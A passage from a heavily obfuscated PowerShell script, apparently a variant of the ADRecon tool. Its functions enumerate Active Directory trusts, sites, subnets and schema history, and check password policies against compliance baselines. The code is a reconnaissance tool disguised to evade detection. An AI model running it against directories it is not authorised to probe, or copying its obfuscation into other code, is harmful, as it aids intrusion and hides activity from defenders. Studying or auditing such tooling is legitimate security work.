                $Obj | Add-Member -MemberType ("{0}{3}{1}{2}" -f'No','e','Property','t') -Name ("{2}{1}{0}" -f 'anged','h','whenC') -Value ([DateTime] $($_."PRO`pe`RTiEs"."when`Ch`AnG`Ed"))
                $ADTrustObj += $Obj
            }
            Remove-Variable ("{0}{1}{2}"-f 'ADT','rust','s')
        }
    }

    If ($ADTrustObj)
    {
        Return $ADTrustObj
    }
    Else
    {
        Return $null
    }
}

Function GeT-aD`Rsi`Te
{

    param(
        [Parameter(mAnDaTOrY = $true)]
        [string] $Method,

        [Parameter(mANdATorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNDAtorY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(maNdAtORy = $false)]
        [string] $DomainController,

        [Parameter(mAndatORY = $false)]
        [Management.Automation.PSCredential] $Credential =   (get-vAriablE k49P -Va )::"E`MptY"
    )

    If ($Method -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            $SearchPath = ("{0}{1}"-f 'CN','=Sites')
            $ADSites = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{0}{3}{4}{2}{1}"-f'(obje','site)','s=','ct','Clas') -Properties ("{1}{0}"-f'ame','N'),("{3}{2}{0}{1}" -f 'iptio','n','cr','Des'),("{2}{3}{1}{0}" -f'ed','at','wh','enCre'),("{2}{1}{0}{3}" -f 'han','henC','w','ged')
        }
        Catch
        {
            Write-Warning ("{4}{3}{10}{6}{5}{1}{0}{9}{7}{2}{8}" -f 'um','en','t','S','[Get-ADR','hile ','e] Error w','ting Site Objec','s','era','it')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites)) "
            
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                
                $Obj = New-Object ("{2}{0}{1}"-f 'Ob','ject','PS')
                $Obj | Add-Member -MemberType ("{1}{3}{0}{2}"-f 'op','Not','erty','ePr') -Name ("{0}{1}" -f'Na','me') -Value $_."na`me"
                $Obj | Add-Member -MemberType ("{2}{0}{1}" -f 'ote','Property','N') -Name ("{1}{2}{0}" -f 'tion','De','scrip') -Value $_."dE`ScR`IpTIon"
                $Obj | Add-Member -MemberType ("{0}{1}{2}" -f 'Not','eProper','ty') -Name ("{2}{0}{1}" -f'at','ed','whenCre') -Value $_."whEN`CREA`TeD"
                $Obj | Add-Member -MemberType ("{1}{3}{0}{2}" -f'op','No','erty','tePr') -Name ("{0}{2}{1}" -f 'whe','nged','nCha') -Value $_."W`h`enCHaNgEd"
                $ADSiteObj += $Obj
            }
            Remove-Variable ("{1}{0}"-f 'tes','ADSi')
        }
    }

    If ($Method -eq ("{0}{1}" -f 'L','DAP'))
    {
        $SearchPath = ("{0}{2}{1}"-f 'CN','Sites','=')
        If ($Credential -ne   (Get-VaRIaBle ("k4"+"9p")  -VAl  )::"Em`pTY")
        {
            $objSearchPath = New-Object ("{2}{3}{7}{5}{0}{9}{6}{4}{1}{8}"-f 'es','t','Syste','m.Dire','ectoryEn','rvic','ir','ctorySe','ry','.D') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential."USe`R`NaMe",$Credential.("{5}{1}{4}{3}{2}{0}" -f 'l','etN','Credentia','rk','etwo','G').Invoke()."P`AS`SWOrD"
        }
        Else
        {
            $objSearchPath = New-Object ("{6}{5}{7}{4}{0}{8}{1}{2}{9}{10}{3}"-f'ire','toryS','e','ctoryEntry','.D','ys','S','tem','c','rvice','s.Dire') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object ("{0}{3}{5}{4}{1}{7}{2}{6}" -f'S','irecto','Services.Direct','ys','em.D','t','orySearcher','ry') $objSearchPath
        $ObjSearcher."fiLT`ER" = (("{2}{3}{0}{1}"-f'as','s=site)','(objectC','l'))
        $ObjSearcher."SEA`RChS`CoPe" = ("{0}{1}" -f'Subtr','ee')

        Try
        {
            $ADSites = $ObjSearcher.("{2}{0}{1}" -f 'Al','l','Find').Invoke()
        }
        Catch
        {
            Write-Warning ("{8}{0}{3}{5}{4}{6}{1}{2}{7}"-f '] Er','nu','merating S','r',' wh','or','ile e','ite Objects','[Get-ADRSite')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}" -f 'ose','disp').Invoke()

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites)) "
            
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                
                $Obj = New-Object ("{1}{2}{0}"-f'ct','PS','Obje')
                $Obj | Add-Member -MemberType ("{3}{2}{0}{1}"-f 'e','rty','teProp','No') -Name ("{1}{0}" -f'ame','N') -Value $([string] $_."PRO`pE`RTies"."n`AMe")
                $Obj | Add-Member -MemberType ("{0}{2}{1}"-f 'NoteProp','ty','er') -Name ("{2}{1}{0}{3}"-f'io','t','Descrip','n') -Value $([string] $_."PR`OpErt`IeS"."DeS`C`Ri`PtION")
                $Obj | Add-Member -MemberType ("{0}{2}{3}{1}"-f 'N','rty','ot','ePrope') -Name ("{2}{0}{1}" -f 'nCre','ated','whe') -Value ([DateTime] $($_."PR`OPERt`IES"."wHen`CrEaT`Ed"))
                $Obj | Add-Member -MemberType ("{1}{0}{2}"-f'e','NoteProp','rty') -Name ("{0}{1}{2}" -f 'w','henCh','anged') -Value ([DateTime] $($_."pRoper`T`IEs"."Wh`eNc`hAnGeD"))
                $ADSiteObj += $Obj
            }
            Remove-Variable ("{0}{1}{2}" -f 'ADSi','te','s')
        }
    }

    If ($ADSiteObj)
    {
        Return $ADSiteObj
    }
    Else
    {
        Return $null
    }
}

Function gET-AD`RSu`Bn`eT
{

    param(
        [Parameter(mandatorY = $true)]
        [string] $Method,

        [Parameter(maNdatoRY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mandatoRY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(mAndatORY = $false)]
        [string] $DomainController,

        [Parameter(MAnDaTORY = $false)]
        [Management.Automation.PSCredential] $Credential =   $k49P::"e`mpty"
    )

    If ($Method -eq ("{0}{1}"-f 'ADW','S'))
    {
        Try
        {
            $SearchPath = ("{2}{4}{5}{0}{3}{1}"-f'ts,CN=','s','CN','Site','=Su','bne')
            $ADSubnets = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{3}{2}{0}{5}{1}{6}{4}" -f 's','n','objectClass=','(','t)','ub','e') -Properties ("{0}{1}"-f 'Nam','e'),("{0}{2}{1}"-f 'Desc','tion','rip'),("{2}{1}{0}" -f'bject','eO','sit'),("{0}{1}{2}"-f 'whe','nCre','ated'),("{2}{0}{1}" -f'nCha','nged','whe')
        }
        Catch
        {
            Write-Warning ("{11}{3}{7}{10}{6}{9}{1}{4}{8}{2}{0}{5}"-f'ject','ng ','Ob','et-','S','s','m','ADRSubnet] Error while','ubnet ','erati',' enu','[G')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets)) "
            
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                
                $Obj = New-Object ("{0}{2}{1}" -f 'P','ect','SObj')
                $Obj | Add-Member -MemberType ("{1}{0}{2}"-f 'tePropert','No','y') -Name ("{0}{1}"-f 'S','ite') -Value $(($_."siTEOB`J`ect" -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType ("{0}{1}{2}{3}" -f'No','te','Pro','perty') -Name ("{1}{0}"-f'me','Na') -Value $_."Na`me"
                $Obj | Add-Member -MemberType ("{1}{0}{2}" -f 't','No','eProperty') -Name ("{3}{2}{1}{0}"-f 'ion','t','scrip','De') -Value $_."DeScr`IpT`IoN"
                $Obj | Add-Member -MemberType ("{1}{0}{2}" -f 'e','NoteProp','rty') -Name ("{1}{0}{2}" -f'eate','whenCr','d') -Value $_."w`HEN`crEAt`Ed"
                $Obj | Add-Member -MemberType ("{1}{2}{0}"-f 'perty','NotePr','o') -Name ("{1}{0}{3}{2}" -f'he','w','ged','nChan') -Value $_."wheN`c`HanGED"
                $ADSubnetObj += $Obj
            }
            Remove-Variable ("{0}{1}{3}{2}" -f 'ADS','u','s','bnet')
        }
    }

    If ($Method -eq ("{0}{1}"-f'L','DAP'))
    {
        $SearchPath = ("{2}{1}{3}{0}"-f'=Sites','N=Subn','C','ets,CN')
        If ($Credential -ne   ( iTeM ('vaR'+'i'+'aBLe'+':K49p')  ).VaLUE::"e`mpTY")
        {
            $objSearchPath = New-Object ("{0}{5}{7}{1}{6}{3}{2}{4}"-f 'System','ySer','ct','ces.Dire','oryEntry','.Direc','vi','tor') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential."u`SErN`AmE",$Credential.("{2}{3}{1}{4}{0}" -f'al','ent','GetNet','workCred','i').Invoke()."PAssw`orD"
        }
        Else
        {
            $objSearchPath = New-Object ("{0}{7}{3}{10}{4}{11}{2}{8}{6}{5}{9}{1}" -f'Sys','ntry','.Dir','irec','Ser','tory','c','tem.D','e','E','tory','vices') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object ("{1}{6}{2}{5}{0}{4}{3}"-f'D','Sys','m.Dir','rySearcher','irecto','ectoryServices.','te') $objSearchPath
        $ObjSearcher."FIl`TEr" = ("{1}{0}{4}{3}{2}"-f'objectClass=','(','net)','ub','s')
        $ObjSearcher."s`eARCH`s`coPe" = ("{0}{1}" -f'Su','btree')

        Try
        {
            $ADSubnets = $ObjSearcher.("{1}{0}{2}" -f 'n','Fi','dAll').Invoke()
        }
        Catch
        {
            Write-Warning ("{3}{12}{11}{2}{4}{14}{0}{8}{13}{7}{1}{5}{10}{9}{6}"-f 'or','nu','n','[G','e','mera','cts','ile e',' ','ng Subnet Obje','ti','ub','et-ADRS','wh','t] Err')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{2}{0}{1}" -f 'sp','ose','di').Invoke()

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets)) "
            
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                
                $Obj = New-Object ("{0}{2}{1}" -f 'P','t','SObjec')
                $Obj | Add-Member -MemberType ("{1}{0}{2}"-f'Pr','Note','operty') -Name ("{0}{1}" -f 'Si','te') -Value $((([string] $_."pR`OPEr`TiES"."sI`T`EO`BjECT") -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType ("{1}{0}{2}" -f 'roper','NoteP','ty') -Name ("{0}{1}"-f 'Na','me') -Value $([string] $_."pr`O`PerTi`ES"."N`Ame")
                $Obj | Add-Member -MemberType ("{2}{0}{1}"-f'P','roperty','Note') -Name ("{3}{1}{0}{2}"-f 'i','cript','on','Des') -Value $([string] $_."pr`O`PerT`ieS"."D`E`SCRipTI`On")
                $Obj | Add-Member -MemberType ("{1}{2}{0}" -f'ty','NotePr','oper') -Name ("{2}{0}{1}" -f 'henC','reated','w') -Value ([DateTime] $($_."Pr`oPERtI`eS"."w`HENC`REaT`ED"))
                $Obj | Add-Member -MemberType ("{0}{2}{1}"-f'NotePrope','ty','r') -Name ("{2}{1}{0}" -f 'd','nge','whenCha') -Value ([DateTime] $($_."Pr`oPerTI`eS"."WhEn`ChAn`gEd"))
                $ADSubnetObj += $Obj
            }
            Remove-Variable ("{0}{2}{1}"-f'ADS','nets','ub')
        }
    }

    If ($ADSubnetObj)
    {
        Return $ADSubnetObj
    }
    Else
    {
        Return $null
    }
}


Function GE`T`-aD`RsChEMAhi`s`TOry
{

    param(
        [Parameter(maNdaTORy = $true)]
        [string] $Method,

        [Parameter(MaNDaTORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(maNDaTory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(MaNdaToRY = $false)]
        [string] $DomainController,

        [Parameter(MAndatORy = $false)]
        [Management.Automation.PSCredential] $Credential =  $K49P::"emP`TY"
    )

    If ($Method -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            $ADSchemaHistory = @( Get-ADObject -SearchBase ((Get-ADRootDSE)."SC`HE`mANaMIN`gC`o`NTeXt") -SearchScope ("{0}{1}{2}"-f'On','eLev','el') -Filter * -Property ("{4}{2}{3}{0}{1}" -f's','hedName','istin','gui','D'), ("{1}{0}" -f 'e','Nam'), ("{2}{1}{0}{3}" -f'ctCla','e','Obj','ss'), ("{0}{2}{1}" -f'when','ged','Chan'), ("{0}{3}{2}{1}"-f 'wh','ted','ea','enCr') )
        }
        Catch
        {
            Write-Warning ("{13}{5}{6}{2}{11}{8}{12}{1}{10}{4}{0}{3}{9}{14}{7}"-f 'mer','hile ','chem','ating ','u','et','-ADRS','cts','istory] Error ','Schema ','en','aH','w','[G','Obje')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.ADWSClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj =  $jwB18::("{0}{2}{1}" -f 'Sch','er','emaPars').Invoke($ADSchemaHistory, $Threads)
            Remove-Variable ("{0}{1}{2}" -f 'ADSchema','Hist','ory')
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LDA','P'))
    {
        If ($Credential -ne  ( GEt-iTem ("vARI"+"ab"+"LE:K4"+"9P")  ).VAlUE::"Em`pTy")
        {
            $objSearchPath = New-Object ("{6}{4}{0}{1}{3}{5}{7}{2}" -f 'rectoryServ','ice','y','s','tem.Di','.Direc','Sys','toryEntr') "LDAP://$($DomainController)/$($objDomainRootDSE.schemaNamingContext)", $Credential."USe`RNAmE",$Credential.("{2}{0}{3}{1}"-f'rede','al','GetNetworkC','nti').Invoke()."P`Ass`WOrD"
        }
        Else
        {
            $objSearchPath = New-Object ("{5}{8}{6}{9}{3}{4}{10}{0}{7}{2}{1}" -f'D','ry','oryEnt','ctory','Servic','Syste','.D','irect','m','ire','es.') "LDAP://$($objDomainRootDSE.schemaNamingContext)"
        }
        $objSearcher = New-Object ("{5}{6}{0}{2}{1}{4}{3}{8}{7}"-f'm.Di','vices.Dir','rectorySer','tory','ec','S','yste','cher','Sear') $objSearchPath
        $ObjSearcher."fi`lter" = (("{2}{1}{0}" -f'ass=*)','ctCl','(obje'))
        $ObjSearcher."PR`OPeRTieS`TOLOaD".("{2}{1}{0}"-f'nge','ddRa','A').Invoke((("{3}{2}{1}{0}" -f 'e','ednam','istinguish','d'),("{1}{0}" -f 'me','na'),("{0}{2}{1}" -f'obj','lass','ectc'),("{1}{2}{0}" -f'changed','wh','en'),("{1}{0}{3}{2}"-f 'e','wh','created','n')))
        $ObjSearcher."sEa`Rchsco`PE" = ("{1}{0}" -f'eLevel','On')

        Try
        {
            $ADSchemaHistory = $ObjSearcher.("{1}{0}" -f 'll','FindA').Invoke()
        }
        Catch
        {
            Write-Warning ("{9}{5}{6}{10}{2}{4}{11}{7}{0}{8}{15}{16}{12}{13}{1}{14}{3}" -f'ror whil',' Sch','Hi',' Objects','stor','et-AD','RSchem','] Er','e','[G','a','y','rati','ng','ema',' en','ume')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{2}{0}"-f 'spose','d','i').Invoke()

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.LDAPClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj =   (  gEt-vAriable  ('S'+'07D') ).VAlUE::("{1}{2}{0}" -f 'arser','Schem','aP').Invoke($ADSchemaHistory, $Threads)
            Remove-Variable ("{0}{2}{3}{4}{1}" -f'AD','story','Sch','em','aHi')
        }
    }

    If ($ADSchemaObj)
    {
        Return $ADSchemaObj
    }
    Else
    {
        Return $null
    }
}

Function G`Et-adRdefa`U`Lt`PasSW`orDPOl`iCy
{

    param(
        [Parameter(maNDATOrY = $true)]
        [string] $Method,

        [Parameter(MANdaTory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ("{0}{1}"-f'ADW','S'))
    {
        Try
        {
            $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning ("{19}{7}{18}{9}{24}{8}{13}{15}{22}{10}{4}{12}{20}{3}{2}{16}{14}{0}{1}{21}{17}{5}{11}{6}{23}"-f'Defa','ul','ng t','i','enume','r','Poli','A','ss','l',' while ','d ','r','wordP','e ','olicy','h','wo','DRDefau','[Get-','at','t Pass','] Error','cy','tPa')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADpasspolicy)
        {
            $ObjValues = @( (("{3}{6}{2}{0}{5}{8}{7}{4}{1}" -f'pa','s)','force ','E','d','sswor','n','ory (passwor','d hist')), $ADpasspolicy."PASSworDH`istO`Rycou`NT", "4", ("{0}{3}{1}{2}" -f'R','.','2.5','eq. 8'), "8", ("{0}{1}{2}"-f'Control: ','04','23'), ("{2}{0}{3}{1}"-f'm','re','24 or ','o'),
            (("{0}{4}{2}{3}{5}{1}"-f'Maximum','ays)','word a','ge ',' pass','(d')), $ADpasspolicy."maXpasSw`o`RdaGe"."dA`ys", "90", ("{0}{2}{1}" -f'R','2.4','eq. 8.'), "90", ("{3}{2}{0}{1}"-f':',' 0423','l','Contro'), ("{2}{0}{1}" -f 'o',' 60','1 t'),
            (("{3}{4}{0}{1}{5}{6}{2}" -f'asswo','rd','ys)','Minimu','m p',' ag','e (da')), $ADpasspolicy."M`INPasSwO`RDA`ge"."D`AyS", "N/A", "-", "1", ("{0}{3}{2}{1}"-f 'Co',' 0423','ol:','ntr'), ("{1}{0}{2}"-f'm','1 or ','ore'),
            ("{6}{4}{8}{1}{2}{7}{5}{3}{0}{9}"-f'(ch','um pass','wo','gth ','n','en','Mi','rd l','im','aracters)'), $ADpasspolicy."mINpa`SS`wOrDLE`NGTH", "7", ("{0}{3}{2}{1}"-f'Req','3',' 8.2.','.'), "13", ("{3}{2}{4}{0}{1}" -f': 042','1','ontr','C','ol'), ("{2}{0}{1}{3}" -f '4 ','or','1',' more'),
            ("{0}{2}{3}{8}{9}{7}{6}{5}{1}{4}" -f'Passw','ir','or','d mus','ements','qu','y re','plexit','t meet co','m'), $ADpasspolicy."Co`m`PLeXi`TYeNAB`lED", $true, ("{0}{1}{2}" -f'Req. 8.','2.','3'), $true, ("{1}{0}{2}" -f'l:','Contro',' 0421'), $true,
            ("{10}{19}{17}{6}{20}{13}{2}{14}{8}{18}{12}{11}{7}{5}{1}{3}{4}{15}{16}{0}{9}"-f 'mai','r all user','eve','s',' in','fo','ord ',' ','p','n','St','n','o','ng r','rsible encry',' the',' do','assw','ti','ore p','usi'), $ADpasspolicy."re`VErs`IbL`eenc`RYptI`oNeN`ABled", "N/A", "-", "N/A", "-", $false,
            ("{6}{7}{1}{4}{2}{0}{5}{3}{8}" -f'r',' l','du','ns','ockout ','ation (mi','Accou','nt',')'), $ADpasspolicy."L`oC`KOUtDura`TIon"."MInuT`eS", (("{0}{4}{2}{1}{3}" -f'0',')','nual unlock',' or 30',' (ma')), ("{1}{0}{3}{2}"-f'eq. 8','R','7','.1.'), "N/A", "-", ("{0}{1}{2}{3}"-f'15 ','or ','m','ore'),
            (("{4}{6}{3}{0}{5}{2}{1}" -f'ou','ttempts)','t lockout threshold (a','c','A','n','c')), $ADpasspolicy."LoCko`U`TthreShOLD", ("{0}{1}"-f'1 to',' 6'), ("{1}{2}{0}" -f'.6','Req. 8.','1'), ("{1}{0}" -f'to 5','1 '), ("{1}{4}{3}{2}{0}" -f'1403','Cont',' ','l:','ro'), ("{2}{0}{1}"-f'o 1','0','1 t'),
            ("{9}{8}{7}{6}{10}{1}{3}{5}{0}{2}{4}"-f'r','counte',' (min','r aft','s)','e','nt lock','set accou','e','R','out '), $ADpasspolicy."lockOUt`obs`ERVatiO`Nw`InDOw"."MInUt`Es", "N/A", "-", "N/A", "-", ("{0}{1}{2}" -f'15',' or ','more') )

            Remove-Variable ("{1}{2}{0}" -f 'olicy','ADp','assp')
        }
    }

    If ($Method -eq ("{1}{0}" -f 'AP','LD'))
    {
        If ($ObjDomain)
        {
            
            $pwdProperties = @{
                ("{5}{2}{1}{3}{4}{0}" -f 'COMPLEX','IN_','OMA','PASSW','ORD_','D') = 1;
                ("{1}{0}{3}{2}{4}"-f'MAIN_PASSWORD','DO','_','_NO','ANON_CHANGE') = 2;
                ("{8}{6}{5}{4}{2}{3}{7}{1}{9}{0}"-f'R_CHANGE','O_CLE','ORD','_','SSW','N_PA','MAI','N','DO','A') = 4;
                ("{4}{0}{3}{1}{2}"-f'M','T_AD','MINS','AIN_LOCKOU','DO') = 8;
                ("{5}{2}{1}{3}{4}{6}{0}" -f'TEXT','IN','OMA','_PASSWORD_S','TORE_C','D','LEAR') = 16;
                ("{6}{3}{5}{2}{8}{1}{0}{4}{7}"-f'C','D_','_PA','IN_RE','H','FUSE','DOMA','ANGE','SSWOR') = 32
            }

            If (($ObjDomain."PwdProPe`R`TieS"."V`ALuE" -band $pwdProperties[("{1}{4}{5}{3}{0}{6}{2}"-f 'D_C','D','X','R','OMAI','N_PASSWO','OMPLE')]) -eq $pwdProperties[("{4}{3}{1}{0}{2}"-f 'D','AIN_PASSWOR','_COMPLEX','OM','D')])
            {
                $ComplexPasswords = $true
            }
            Else
            {
                $ComplexPasswords = $false
            }

            If (($ObjDomain."pw`d`P`R`OperTies"."VAl`UE" -band $pwdProperties[("{0}{2}{4}{5}{3}{1}" -f 'DOMAIN_PASSWOR','EARTEXT','D_S','E_CL','TO','R')]) -eq $pwdProperties[("{5}{7}{6}{4}{1}{0}{3}{2}" -f'ORD_STORE','SW','RTEXT','_CLEA','AS','DOMAIN','P','_')])
            {
                $ReversibleEncryption = $true
            }
            Else
            {
                $ReversibleEncryption = $false
            }

            $LockoutDuration = $($ObjDomain.("{1}{7}{2}{4}{6}{5}{0}{3}" -f't','Conv','a','64','rgeIn','oIn','tegerT','ertL').Invoke($ObjDomain."loC`Ko`UTdU`Rati`oN"."VaL`UE")/-600000000)

            If ($LockoutDuration -gt 99999)
            {
                $LockoutDuration = 0
            }

            $ObjValues = @( ("{8}{3}{6}{2}{1}{7}{0}{5}{4}{9}"-f 'histor','e pa','rc','nf','ass','y (p','o','ssword ','E','words)'), $ObjDomain."PwdH`I`Sto`RYl`EnGtH"."vA`lUe", "4", ("{1}{0}{2}"-f'. ','Req','8.2.5'), "8", ("{1}{2}{3}{0}" -f '3','Co','ntrol:',' 042'), ("{1}{0}{2}" -f 'o','24 or m','re'),
            (("{1}{6}{2}{0}{4}{5}{3}"-f'um password','Max','m','ys)',' age (d','a','i')), $($ObjDomain.("{7}{0}{2}{1}{5}{3}{6}{4}" -f 'ert','ar','L','Integ','ToInt64','ge','er','Conv').Invoke($ObjDomain."MAXPwDa`gE"."vA`LUe") /-864000000000), "90", ("{1}{2}{0}"-f '.2.4','Re','q. 8'), "90", ("{2}{0}{3}{1}"-f 'ntrol','423','Co',': 0'), ("{1}{2}{0}" -f '60','1',' to '),
            ("{6}{2}{4}{1}{7}{0}{3}{5}"-f ' ','word ','m pas','(','s','days)','Minimu','age'), $($ObjDomain.("{3}{5}{7}{0}{6}{4}{2}{1}" -f'rtL','t64','n','Co','eIntegerToI','n','arg','ve').Invoke($ObjDomain."mINP`Wda`gE"."VA`Lue") /-864000000000), "N/A", "-", "1", ("{3}{1}{0}{2}{4}"-f 'l','ro',': 042','Cont','3'), ("{2}{0}{1}" -f 'r mo','re','1 o'),
            ("{9}{2}{7}{6}{3}{10}{1}{0}{4}{5}{8}"-f' ','gth','nim','assw','(charac','ter',' p','um','s)','Mi','ord len'), $ObjDomain."mIn`PwD`leNgTH"."Va`LUe", "7", ("{3}{0}{2}{1}"-f'e','3','q. 8.2.','R'), "13", ("{0}{2}{1}"-f 'Control','1',': 042'), ("{3}{0}{1}{2}"-f'4 or',' mo','re','1'),
            ("{3}{4}{0}{1}{5}{2}{6}" -f't complexi','ty ','quir','Password',' must mee','re','ements'), $ComplexPasswords, $true, ("{1}{0}{2}"-f'. ','Req','8.2.3'), $true, ("{1}{0}{2}"-f'trol: 042','Con','1'), $true,
            ("{4}{17}{7}{15}{3}{11}{14}{10}{2}{13}{8}{18}{9}{5}{16}{1}{0}{6}{12}"-f 'rs i','e','ve','swor','Sto','cryption for all ','n th','p','i','le en','ng re','d us','e domain','rs','i','as','us','re ','b'), $ReversibleEncryption, "N/A", "-", "N/A", "-", $false,
            ("{3}{0}{1}{2}{5}{4}"-f'c','count ','lockou','A','ration (mins)','t du'), $LockoutDuration, ("{0}{2}{4}{3}{1}" -f '0 (manua',' or 30','l unl','k)','oc'), ("{1}{0}{2}"-f '. 8.','Req','1.7'), "N/A", "-", ("{0}{2}{1}"-f '15','ore',' or m'),
            ("{7}{5}{6}{8}{1}{2}{0}{9}{4}{3}"-f' threshold (a','ko','ut','pts)','tem','cco','u','A','nt loc','t'), $ObjDomain."Loc`ko`UTTHREs`h`OlD"."VA`LUE", ("{1}{0}"-f'o 6','1 t'), ("{1}{2}{0}"-f '. 8.1.6','R','eq'), ("{1}{0}" -f 'o 5','1 t'), ("{1}{3}{2}{0}"-f'403','Cont','1','rol: '), ("{1}{0}{2}" -f't','1 ','o 10'),
            (("{5}{3}{1}{4}{6}{0}{2}"-f'min','ccount locko','s)',' a','ut ','Reset','counter after (')), $($ObjDomain.("{4}{1}{5}{7}{3}{0}{2}{6}" -f 'In','ar','t6','To','ConvertL','ge','4','Integer').Invoke($ObjDomain."LO`ckOu`ToBSeRVAtiONW`I`ND`ow"."vAL`Ue")/-600000000), "N/A", "-", "N/A", "-", ("{2}{1}{0}"-f 're','or mo','15 ') )

            Remove-Variable ("{2}{3}{1}{0}" -f'erties','op','pwd','Pr')
            Remove-Variable ("{4}{0}{1}{2}{3}" -f'ple','x','Pass','words','Com')
            Remove-Variable ("{4}{0}{2}{3}{1}" -f 'e','ncryption','versi','bleE','R')
        }
    }

    If ($ObjValues)
    {
        $ADPassPolObj = @()
        For ($i = 0; $i -lt $($ObjValues."Cou`Nt"); $i++)
        {
            $Obj = New-Object ("{2}{1}{0}"-f 'ect','Obj','PS')
            $Obj | Add-Member -MemberType ("{2}{0}{1}"-f'ert','y','NoteProp') -Name ("{0}{1}"-f'Polic','y') -Value $ObjValues[$i]
            $Obj | Add-Member -MemberType ("{2}{0}{1}"-f 'rope','rty','NoteP') -Name ("{0}{1}{2}{3}" -f 'C','urrent ','Va','lue') -Value $ObjValues[$i+1]
            $Obj | Add-Member -MemberType ("{1}{2}{3}{0}"-f 'y','Not','ePr','opert') -Name ("{1}{0}{2}{3}" -f' Requir','PCI DSS','eme','nt') -Value $ObjValues[$i+2]
            $Obj | Add-Member -MemberType ("{1}{0}{3}{2}" -f 'tePrope','No','ty','r') -Name ("{2}{1}{0}{3}"-f '3.2','SS v','PCI D','.1') -Value $ObjValues[$i+3]
            $Obj | Add-Member -MemberType ("{2}{0}{1}" -f 't','eProperty','No') -Name ("{2}{0}{1}" -f 'S','D ISM','A') -Value $ObjValues[$i+4]
            $Obj | Add-Member -MemberType ("{2}{3}{0}{1}" -f'ePr','operty','No','t') -Name ("{2}{1}{3}{0}"-f 'trols','8 ','201','ISM Con') -Value $ObjValues[$i+5]
            $Obj | Add-Member -MemberType ("{3}{2}{1}{0}"-f'y','Propert','e','Not') -Name ("{1}{2}{0}{5}{3}{4}"-f'ch','CIS B','en','rk',' 2016','ma') -Value $ObjValues[$i+6]
            $i += 6
            $ADPassPolObj += $Obj
        }
        Remove-Variable ("{0}{2}{1}" -f 'Obj','ues','Val')
        Return $ADPassPolObj
    }
    Else
    {
        Return $null
    }
}

Function G`ET-adrFiN`egrAIne`D`P`AssWo`RdpOlICY
{

    param(
        [Parameter(maNdAtORy = $true)]
        [string] $Method,

        [Parameter(mANdATOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ("{1}{0}" -f 'WS','AD'))
    {
        Try
        {
            $ADFinepasspolicy = Get-ADFineGrainedPasswordPolicy -Filter *
        }
        Catch
        {
            Write-Warning ("{4}{10}{2}{16}{7}{12}{15}{3}{11}{9}{8}{13}{6}{17}{14}{1}{18}{0}{5}"-f'ine Grained Passwo',' enum','e','E','[Get-A','rd Policy','i','sswordPol',' w','or','DRFineGrain','rr','icy','h','e','] ','dPa','l','erating the F')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADFinepasspolicy)
        {
            $ADPassPolObj = @()

            $ADFinepasspolicy | ForEach-Object {
                For($i=0; $i -lt $($_."APpLIe`S`TO"."CO`Unt"); $i++)
                {
                    $AppliesTo = $AppliesTo + "," + $_."appl`I`ESto"[$i]
                }
                If ($null -ne $AppliesTo)
                {
                    $AppliesTo = $AppliesTo.("{1}{2}{0}" -f'rt','Tri','mSta').Invoke(",")
                }
